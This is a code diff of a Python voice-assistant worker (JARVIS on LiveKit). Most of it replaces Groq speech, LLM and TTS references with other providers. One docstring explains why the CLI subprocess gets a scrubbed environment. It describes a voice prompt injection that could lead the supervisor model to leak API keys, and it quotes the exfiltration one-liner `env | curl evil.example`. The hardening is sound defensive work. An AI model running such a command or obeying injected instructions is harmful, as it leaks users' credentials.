@@ -3,7 +3,7 @@ JARVIS voice agent — LiveKit worker.
 
 Connects to the local LiveKit SFU as a Python worker. When any client
 joins a room, this worker spawns a job, sets up the voice pipeline
-(Silero VAD → Groq Whisper STT → Groq Llama LLM → Groq Orpheus TTS),
+(Silero VAD → faster-whisper STT → multi-provider LLM → Kokoro TTS),
 and holds a conversation over WebRTC.
 
 Architecture:
@@ -28,7 +28,7 @@ Env (from .env alongside this file, loaded by systemd unit):
     LIVEKIT_URL         ws://127.0.0.1:7880  (or ws://<tailscale-ip>:7880)
     LIVEKIT_API_KEY     matches livekit.yaml keys block
     LIVEKIT_API_SECRET  matches livekit.yaml keys block
-    GROQ_API_KEY        required for STT/LLM/TTS via Groq
+    DEEPSEEK_API_KEY    primary speech-LLM key (all provider keys: ~/.jarvis/keys.env)
 """
 from __future__ import annotations
 
@@ -67,7 +67,7 @@ from livekit.agents.voice.room_io import RoomOptions
 # Load env BEFORE any provider client is constructed.
 # Priority chain (lowest → highest), each layer overrides the previous:
 #   1) Repo-root .env  — centralized LLM provider keys
-#      (GROQ/DEEPSEEK/GOOGLE/etc., consolidated 2026-05-15).
+#      (DEEPSEEK/GOOGLE/etc., consolidated 2026-05-15).
 #      systemd EnvironmentFile= also loads repo files, but the explicit
 #      load here ensures `python jarvis_agent.py` (pytest, ad-hoc runs)
 #      sees the keys without depending on systemd.
@@ -172,7 +172,7 @@ import sanitizers.deepseek_roundtrip as deepseek_roundtrip
 deepseek_roundtrip.install()
 
 # Strip image content blocks from OpenAI-format messages before they reach a
-# TEXT-ONLY conversational model (DeepSeek/Groq/Kimi/local). An image_url block
+# TEXT-ONLY conversational model (DeepSeek/Kimi/local). An image_url block
 # in chat_ctx 400s those providers NON-RETRYABLY ("unknown variant image_url,
 # expected text"), which kills the inference task AND — because the image stays
 # in history — bricks every subsequent turn (JARVIS acks then never returns the
@@ -210,7 +210,7 @@ strict_schema_relax.install()
 # false` on every supervisor turn while Claude Haiku 4.5 was the
 # routed speech model. The strict_schema_relax patch above gives
 # us legacy schemas (no additionalProperties anywhere), which is
-# fine for Groq but a hard reject for Anthropic. This patch runs
+# fine for OpenAI-compatible providers but a hard reject for Anthropic. This patch runs
 # AFTER strict_schema_relax — it walks the schema tree produced
 # by parse_function_tools('anthropic', ...) and sets the flag on
 # every object node. Idempotent.
@@ -219,7 +219,7 @@ anthropic_strict_schema.install()
 
 # Recover from `tool call validation failed: attempted to call tool
 # '<name> {<json>}' which was not in request.tools` — the recurring
-# bug where some Groq models jam JSON args into the name field.
+# bug where some OpenAI-compat models jam JSON args into the name field.
 # install() catches the APIError, parses out the real name + args,
 # and synthesizes a clean ChatChunk so the turn isn't lost.
 import sanitizers.tool_name as tool_name_sanitizer
@@ -234,7 +234,7 @@ tool_name_sanitizer.install()
 import sanitizers.dsml as dsml_sanitizer
 dsml_sanitizer.install()
 
-# Suppress tool-call-as-Python-text leaks (Groq llama-3.3-70b
+# Suppress tool-call-as-Python-text leaks (llama-3.3-era rungs
 # occasionally emits `browser_task_v2("...")  task_done(summary)`
 # as content text instead of via the tool_calls field). Patches
 # _parse_choice; stacks on top of dsml_sanitizer.
@@ -267,7 +267,7 @@ sanitizers.internal_phrase.install()
 import sanitizers.output_language
 sanitizers.output_language.install()
 
-# Wrap LLM streams in asyncio.wait_for so stalled Groq connections
+# Wrap LLM streams in asyncio.wait_for so stalled provider connections
 # raise TimeoutError after JARVIS_LLM_IDLE_TIMEOUT (default 30s)
 # instead of hanging forever. Captured live 2026-05-02: subagent
 # on_enter fired then 3+ minutes of dead air — connect-only timeout
@@ -408,14 +408,10 @@ from tools._adapter import load_all_livekit_tools
 # into the registry framework one wave at a time.
 
 
-# ── Groq TTS error-body logging shim ──────────────────────────────────
-# Diagnostic: the upstream livekit-plugins-groq adapter constructs
-# APIStatusError with body=None on non-2xx, so /tmp/jarvis-voice-agent.log
-# only shows "Bad Request" with no detail on what Groq actually rejected
-# (voice name? model id? payload field?). Subclass the plugin's
-# ChunkedStream to read and log resp.text() before raising the same
-# error — preserves FallbackAdapter behaviour, just adds visibility.
-# Remove once the underlying 400 is identified and fixed.
+# ── Framework error types + aiohttp ──────────────────────────────────
+# (The old cloud-TTS error-body logging shim that lived here was removed
+# 2026-06-29 with its provider; these imports stay — the resilience
+# wrappers and inline classifier below use them.)
 import aiohttp as _aiohttp
 from livekit.agents import RunContext
 from livekit.agents import APIConnectionError as _APIConnectionError
@@ -426,7 +422,7 @@ from livekit.agents import utils as _lk_utils
 
 
 # ── Per-upstream circuit breakers ────────────────────────────────────
-# Three independent breakers gate the Groq endpoints. A DNS / API
+# Three independent breakers gate the cloud provider endpoints. A DNS / API
 # Per-upstream circuit breakers — singletons live in `resilience/__init__.py`
 # (moved 2026-05-10 so provider classes splitting out of this file can
 # import them without circular-import gymnastics). Aliased to the legacy
@@ -474,8 +470,8 @@ def _build_skill_catalog_block() -> str:
 
 
 # Extracted to providers/stt.py 2026-05-10 (Step 5a of the 10/10
-# refactor; the Groq Whisper STT class + breakered factory were removed
-# 2026-06-29 in the full-Groq-eradication pass). build_stt_chain is
+# refactor; the cloud Whisper STT class + breakered factory were removed
+# 2026-06-29 in the provider-eradication pass). build_stt_chain is
 # re-exported under its legacy underscored name so call sites stay untouched.
 from providers.stt import (
     build_stt_chain as _build_stt_chain,
@@ -484,7 +480,7 @@ from providers.stt import (
 
 # Extracted to providers/llm.py 2026-05-10 (Step 5b of the 10/10
 # refactor). Re-exported under the legacy underscored name so the
-# constructor call inside _BreakeredGroqLLM.chat + the two tests
+# constructor call inside the (since-removed) breakered LLM shim + the two tests
 # (test_breaker_shims.py + test_voice_fixes_2026_05_04.py) keep
 # working unchanged.
 from providers.llm import BreakeredLLMStream as _BreakeredLLMStream
@@ -953,16 +949,16 @@ async def _restart_voice_client_after_crash() -> None:
 
 
 # ── CLI model selection ────────────────────────────────────────────────
-# The system tray exposes 5 CLI-model choices (mirroring the CLI's own
-# /model picker — DeepSeek×2, Groq×3). The user's pick is written to
+# The system tray exposes the CLI-model choices (mirroring the CLI's own
+# /model picker). The user's pick is written to
 # this file; run_jarvis_cli reads it on every spawn and exports the
 # matching JARVIS_PROVIDER + JARVIS_MODEL env vars to the CLI
 # subprocess. So switching takes effect on the very next tool call —
 # no restart needed.
 #
-# The voice agent's OWN conversational LLM stays on Groq llama-3.3-70b
-# regardless. That's a latency optimisation and not surfaced to the
-# user — the tray controls only the CLI's model.
+# The voice agent's OWN conversational LLM is picked separately (the
+# speech-model section below) — this tray submenu controls only the
+# CLI's model.
 CLI_MODEL_FILE   = Path.home() / ".jarvis" / "cli-model"
 DEFAULT_CLI_MODEL = "deepseek-v4-pro"
 
@@ -975,8 +971,8 @@ DEFAULT_CLI_MODEL = "deepseek-v4-pro"
 # once at session start; we can't hot-swap it like the CLI tool model.
 # voice-client triggers the systemctl restart on POST /voice-model.
 #
-# Defaults to llama-3.3-70b on Groq for low first-token latency
-# (~200 ms). Other options trade latency for capability.
+# The default lives in providers/llm.py::DEFAULT_SPEECH_MODEL
+# (deepseek-chat since 2026-06-29). Options trade latency for capability.
 #
 # Extracted 2026-05-10 (Step 5e of the 10/10 refactor):
 #   - _read_unified_setting → pipeline.settings.read_unified_setting
@@ -995,8 +991,9 @@ from providers.llm import (
 )
 
 # TTS provider switching — written by the tray via /tts-provider on
-# the voice client. Format: "<provider>:<voice>", e.g. "groq:troy".
-# Only `groq:<voice>` is accepted post-2026-05-01 (ElevenLabs removed).
+# the voice client. Format: "<provider>:<voice>", e.g. "kokoro:af_bella".
+# Engines: `kokoro:<voice>` / `edge:<voice>` (2026-06-29+; ElevenLabs
+# removed 2026-05-01).
 TTS_PROVIDER_FILE = Path.home() / ".jarvis" / "tts-provider"
 
 
@@ -1055,31 +1052,8 @@ CLI_MODELS: dict[str, dict] = {
         "model":    "deepseek-v4-pro",
         "label":    "DeepSeek · v4 pro",
     },
-    "qwen/qwen3-32b": {
-        "provider": "groq",
-        "model":    "qwen/qwen3-32b",
-        "label":    "Groq · qwen3-32b",
-    },
-    "qwen/qwen3.6-27b": {
-        "provider": "groq",
-        "model":    "qwen/qwen3.6-27b",
-        "label":    "Groq · qwen3.6-27b",
-    },
-    "llama-3.3-70b-versatile": {
-        "provider": "groq",
-        "model":    "llama-3.3-70b-versatile",
-        "label":    "Groq · llama 3.3 70B",
-    },
-    "meta-llama/llama-4-scout-17b-16e-instruct": {
-        "provider": "groq",
-        "model":    "meta-llama/llama-4-scout-17b-16e-instruct",
-        "label":    "Groq · llama 4 scout",
-    },
-    "openai/gpt-oss-120b": {
-        "provider": "groq",
-        "model":    "openai/gpt-oss-120b",
-        "label":    "Groq · gpt-oss-120b",
-    },
+    # (the 5 Groq-hosted entries were removed 2026-07-06 with the provider —
+    #  the CLI proxy no longer routes a 'groq' provider.)
     # Anthropic Claude — three tiers mirroring the Claude Code /model
     # picker. Provider name 'anthropic' matches the CLI-side entry in
     # src/cli/src/utils/model/jarvisModelRegistry.ts; the upstream
@@ -1511,7 +1485,7 @@ def _clean_env_for_cli(cli_model_id: str) -> dict[str, str]:
     EXCEPT the proxy stub keys the CLI legitimately needs to route
     through localhost:4000. Background: a voice prompt-injection that
     talked the supervisor into running `run_jarvis_cli` could otherwise
-    have its CLI subprocess exfiltrate Groq / Anthropic / OpenAI /
+    have its CLI subprocess exfiltrate Anthropic / OpenAI /
     DeepSeek / Kimi / LiveKit / Google / GitHub / Vercel API keys via
     one bash one-liner (`env | curl evil.example`). Now the CLI gets
     the same ANTHROPIC_BASE_URL=localhost:4000 + ANTHROPIC_API_KEY=
@@ -3311,7 +3285,7 @@ def shutil_which(name: str) -> str | None:
 
 # ── TTS guard: strip function-call leakage ────────────────────────────
 #
-# llama-3.3-70b on Groq sometimes emits a tool call as raw TEXT in the
+# llama-3.3-era rungs sometimes emitted a tool call as raw TEXT in the
 # completion stream instead of through the structured tool_call API.
 # When that happens, the TTS voices "function run_jarvis_cli request
 # Show a 3D view of a human being" which sounds completely broken to
@@ -3501,7 +3475,7 @@ async def stamp_first_token(text):
 
 # Convert European space-thousands ("4 000", "1 234 567") to comma
 # notation ("4,000", "1,234,567"). gpt-oss-120b habitually writes
-# numbers with space separators; Groq Orpheus mis-pronounces those
+# numbers with space separators; TTS engines mis-pronounce those
 # (heard 2026-04-28: "4 000" voiced as "forty"). Standard "4,000"
 # is voiced cleanly as "four thousand".
 # Pattern: 1-3 digits, then one+ groups of "<space>3-digits", with
@@ -4096,7 +4070,6 @@ async def _post_turn_text_recovery(session) -> None:
 # underscored names so existing tests + the providers/tts.py lazy
 # import + the entrypoint barge-in call sites stay untouched.
 from pipeline.barge_in import (
-    GROQ_ORPHEUS_BYTES_PER_MS as _GROQ_ORPHEUS_BYTES_PER_MS,
     flatten_chat_content      as _flatten_chat_content,
     record_synthesis          as _record_synthesis,
     truncate_to_heard_portion as _truncate_to_heard_portion,
@@ -4214,7 +4187,7 @@ class JarvisAgent(Agent):
 
         Known degraded edge (deferred to P2c): the gate decides on the route's
         PRIMARY model. If that primary is vision-capable (pixels injected) but the
-        FallbackAdapter then cascades to a text-only rung (Groq llama-3.x) because
+        FallbackAdapter then cascades to a text-only rung because
         the primary errored, the ImageContent rides along and that rung
         ignores/rejects it (wasted tokens). Rare — the primary had to fail first.
         Hardening (strip ImageContent on the text-only rung) is a P2c follow-up."""
@@ -4241,7 +4214,7 @@ class JarvisAgent(Agent):
             logger.debug("[vision] injection skipped", exc_info=True)
 
         # Vision TOOL for a text-only brain (the P2c follow-up, done): when the
-        # route model can't see (decide_mode == "text" — e.g. DeepSeek/Groq/Kimi
+        # route model can't see (decide_mode == "text" — e.g. DeepSeek/Kimi
         # default), describe any images in THIS generation's ctx out-of-band via
         # Gemini so a text-only supervisor can actually talk about them, instead
         # of dropping/choking. Cached; best-effort — failures fall through to
@@ -4836,7 +4809,7 @@ def prewarm(proc: JobProcess) -> None:
     first-word misses, but the looser gate let room tone through,
     Whisper turned that into " Thank you." (canonical YouTube-trained
     silence-hallucination), llama-3.1-8b-instant attempted a tool
-    call on the junk transcript, Groq returned malformed-tool-call,
+    call on the junk transcript, the provider returned malformed-tool-call,
     breaker opened, 30 s recovery cascade. The Whisper hallucination
     filter in `_is_garbage_transcript()` is the safety net; THIS knob
     is the upstream half of the pair.
@@ -4988,7 +4961,7 @@ def _build_llm_stack() -> dict:
     Returns a dict with the eight pieces of state the rest of
     entrypoint() needs:
       - speech_id       : str        — tray-pick id, for telemetry
-      - speech_llm      : groq.LLM   — single-LLM fallback path
+      - speech_llm      : llm.LLM    — single-LLM fallback path
       - dispatch_llm    : DispatchingLLM | None — Maya per-route LLM
       - dispatch_tts    : DispatchingTTS | None — Maya per-route TTS
       - turn_graph      : LangGraph slow-path | None
@@ -5017,7 +4990,7 @@ def _build_llm_stack() -> dict:
     # personality).
     #
     # Live discovery 2026-05-11: user picked Claude Haiku 4.5 and
-    # reported "replies sound the same" — they were still Groq, because
+    # reported "replies sound the same" — they were still the old default, because
     # of the unconditional pin-disables-dispatcher branch. 2026-05-16
     # global review found the reverse problem: pinning llama-3.3-70b
     # for cost defeated BANTER's 8b fast-path on "Hi Jarvis" turns
@@ -5052,7 +5025,7 @@ def _build_llm_stack() -> dict:
             task_override = active_speech_llm if user_pinned_llm else None
             # Ensure the pinned LLM has a `_jarvis_label` — the dispatcher
             # log and the turn-telemetry `llm_used` field both fall back
-            # to `repr(llm)` (giving "livekit.plugins.groq.services.LLM")
+            # to `repr(llm)` (giving the raw plugin class repr)
             # when this is missing. Use the tray pick's ID as the label.
             if task_override is not None and not getattr(task_override, "_jarvis_label", None):
                 try:
@@ -5368,7 +5341,7 @@ def _register_session_error_handlers(session) -> None:
 
 def _register_session_crash_watchdog(session, bg_tasks: set) -> None:
     """Wire up the `@session.on("close")` watchdog — Step 8c of the
-    10/10 refactor. When Groq STT has a transient network failure,
+    10/10 refactor. When cloud STT had a transient network failure,
     the framework retries 3 times then marks the session
     "unrecoverable". The worker process stays alive but the
     AgentSession is dead — JARVIS goes silent with no feedback.
@@ -5958,8 +5931,8 @@ def _register_state_tracking_handlers(session) -> None:
         """VAD-direct barge-in (Path A step 1, 2026-05-18).
 
         The framework's own barge-in path waits for STT min_words +
-        min_duration confirmation before firing interrupt. With Groq
-        Whisper Turbo (non-streaming) that confirmation only arrives
+        min_duration confirmation before firing interrupt. With
+        non-streaming Whisper STT that confirmation only arrives
         AFTER the user stops talking — way too late. This handler
         fires `session.interrupt()` the moment Silero VAD reports the
         user started speaking (≈50–100 ms after voice onset), without
@@ -6229,7 +6202,7 @@ def _build_initial_prompt_state(active_speech_id: str) -> dict:
     ``CACHE_BREAK_MARKER`` sentinel from ``providers.prompt_cache`` so
     the Anthropic + Gemini wrappers (or the supervisor handing in the
     expected stable prefix via setter) can place their cache
-    breakpoint at the boundary. OpenAI / DeepSeek / Groq auto-cache on
+    breakpoint at the boundary. OpenAI / DeepSeek auto-cache on
     prefix-match and don't need a wrapper — the stable-first ordering
     is what activates their caches.
 
@@ -6490,12 +6463,12 @@ async def entrypoint(ctx: JobContext) -> None:
         # default is 100% on-device (JARVIS_STT_LOCAL_ONLY=1, 2026-06-21).
         # _build_stt_chain still supports an optional Deepgram Nova-3
         # streaming primary when DEEPGRAM_API_KEY is set and local-only is
-        # off; the Groq Whisper rung was removed 2026-06-29. Barge-in is
+        # off; the cloud Whisper rung was removed 2026-06-29. Barge-in is
         # VAD-gated (faster-whisper is finals-only), not STT-confirmed.
         stt=_build_stt_chain(vad=ctx.proc.userdata.get("vad")),
         # Speech LLM — switchable via the tray's "Models" submenu.
-        # Default is deepseek-chat (DEFAULT_SPEECH_MODEL); Groq was
-        # removed 2026-06-29. Switching writes ~/.jarvis/voice-model and
+        # Default is deepseek-chat (DEFAULT_SPEECH_MODEL, 2026-06-29+).
+        # Switching writes ~/.jarvis/voice-model and
         # bounces the agent unit, so the new LLM is built on next startup
         # (read_speech_model() fires below as we exit entrypoint and
         # re-enter on the fresh job dispatch).
@@ -6505,8 +6478,8 @@ async def entrypoint(ctx: JobContext) -> None:
         # ── TTS chain ───────────────────────────────────────────────
         # Provider order is controlled by ~/.jarvis/tts-provider
         # (written by the tray's "Voice" submenu via /tts-provider).
-        # Format: "<provider>:<voice>" — only `groq:<voice>` is
-        # supported (ElevenLabs removed 2026-05-01). Final fallback
+        # Format: "<provider>:<voice>" — `kokoro:<voice>` / `edge:<voice>`
+        # (ElevenLabs removed 2026-05-01). Final fallback
         # is Edge-TTS (no auth, always available). When Maya dispatcher
         # is active, tts_arg is the TASK voice.
         tts=tts_arg,
@@ -6574,7 +6547,7 @@ async def entrypoint(ctx: JobContext) -> None:
                 # ParticipantAudioOutput, pause() only gates new frames
                 # — it does NOT clear the SFU-side AudioSource queue
                 # (room_io/_output.py:129-132 has the clear_queue line
-                # commented out). With Groq Orpheus pushing the whole
+                # commented out). With a fast TTS pushing the whole
                 # utterance to the SFU in well under a second, by the
                 # time pause fires the audio is already buffered at the
                 # SFU and plays to the end. That was the "JARVIS keeps
@@ -6596,19 +6569,19 @@ async def entrypoint(ctx: JobContext) -> None:
                 "max_delay": 4.0,
             },
             "preemptive_generation": {
-                # Disabled because llama-3.3-70b on Groq emits
+                # Disabled because llama-3.3-era fallback rungs emitted
                 # malformed function calls under preemptive generation
                 # with our 3-tool setup — the LLM tries to commit to
                 # a tool call before the user finishes speaking, the
-                # call is malformed, Groq returns "Failed to call a
-                # function", retries exhaust, and the user gets total
+                # call is malformed, the provider returns "Failed to call
+                # a function", retries exhaust, and the user gets total
                 # silence + a permanently-amber tray. Cleaner to wait
                 # for the full user turn and pay the ~200 ms.
                 "enabled": False,
             },
         },
-        # Note: use_tts_aligned_transcript was removed — the Groq
-        # Orpheus TTS plugin doesn't return aligned transcripts, so
+        # Note: use_tts_aligned_transcript was removed — the old cloud
+        # TTS plugin didn't return aligned transcripts, so
         # turning it on just spammed warnings. The DB still gets the
         # whole intended utterance, which is fine for recall.
         #
@@ -6789,7 +6762,7 @@ async def entrypoint(ctx: JobContext) -> None:
     _active_session_for_telemetry[0] = session
 
     # Trim chat_ctx after every assistant turn so long sessions don't
-    # blow past Groq's context window. Keep the most recent CTX_MAX_TURNS
+    # blow past the model's context window. Keep the most recent CTX_MAX_TURNS
     # message objects (user+assistant pairs → 80 items ≈ 40 exchanges).
     # Trim only on assistant turns so we never cut a pair mid-exchange.
     CTX_MAX_TURNS = 80
@@ -7037,8 +7010,8 @@ async def entrypoint(ctx: JobContext) -> None:
                     interrupted_flag = bool(
                         getattr(session, "_jarvis_was_interrupted", False)
                     )
-                    # Pull pre-flight estimate stashed by
-                    # _BreakeredGroqLLM.chat() for the supervisor's
+                    # Pull pre-flight estimate stashed by the breakered
+                    # LLM stream for the supervisor's
                     # turn. Cost is best-effort: if the LLM stream
                     # exposed a `usage` field we use those exact
                     # token counts; otherwise we fall back to the
@@ -7476,14 +7449,15 @@ async def entrypoint(ctx: JobContext) -> None:
                 )
             if applied == 0:
                 # Not an error — the dispatcher may be using non-Anthropic
-                # / non-Gemini primaries (Groq legacy when ANTHROPIC_API_KEY
-                # is unset, OpenAI/DeepSeek as task_override). Those rely
+                # / non-Gemini primaries (legacy fallback rungs when
+                # ANTHROPIC_API_KEY is unset, OpenAI/DeepSeek as
+                # task_override). Those rely
                 # on auto-prefix-cache from stable-first ordering, no
                 # wrapper hookup needed.
                 logger.debug(
                     "[prompt-cache] no cache-aware wrappers found to bind "
                     "stable prefix; relying on auto-prefix-cache (OpenAI/"
-                    "DeepSeek/Groq) for cache hits"
+                    "DeepSeek) for cache hits"
                 )
     except Exception as e:  # noqa: BLE001 — never block session boot on cache wiring
         logger.warning(
@@ -7960,9 +7934,11 @@ if __name__ == "__main__":
         daemon=True,
     ).start()
 
-    # Per-job memory cap, resolved live so the default rises to 5000 when
-    # in-process local STT is on (the 1.6 GB whisper model). See the kwarg below.
+    # Per-job memory cap + warn threshold, resolved live so the defaults rise
+    # when in-process local STT is on (the 1.6 GB whisper model). See the
+    # kwargs below.
     from pipeline.config import job_memory_limit_mb as _job_memory_limit_mb
+    from pipeline.config import job_memory_warn_mb as _job_memory_warn_mb
 
     cli.run_app(
         WorkerOptions(
@@ -7988,8 +7964,7 @@ if __name__ == "__main__":
             # Memory safety net (2026-06-11, retuned 2026-06-21). Recycles a
             # runaway job before its RSS climbs until inference goes
             # slower-than-realtime and the agent wedges (the original 18 h →
-            # silent leak). job_memory_warn_mb (500, framework default) only
-            # WARNS. Default 1500 for cloud STT; raised to 5000 when
+            # silent leak). Default 1500 for cloud STT; raised to 5000 when
             # faster-whisper runs IN-PROCESS (JARVIS_LOCAL_STT_ENABLED=1) — it
             # loads the ~1.6 GB large-v3-turbo model into each job, and at 1500
             # livekit-agents killed every job mid-transcription (exit -10) and
@@ -7997,6 +7972,10 @@ if __name__ == "__main__":
             # 24 kills in ~50 min). Resolved live so it also covers the
             # tray-Local flip. Env JARVIS_JOB_MEMORY_LIMIT_MB wins; 0 disables.
             job_memory_limit_mb=_job_memory_limit_mb(),
+            # Warn threshold raised with the cap (2026-07-06): the framework
+            # 500 sat under the ~1.3 GB local-STT steady state and spammed
+            # "process memory usage is high" every ~5 s (40% of log volume).
+            job_memory_warn_mb=_job_memory_warn_mb(),
             # Bound the SIGTERM drain (framework default: 1800 s). With the
             # desktop voice-client connected a session is ~always "active",
             # so a solo agent stop sat in drain until systemd's stop window
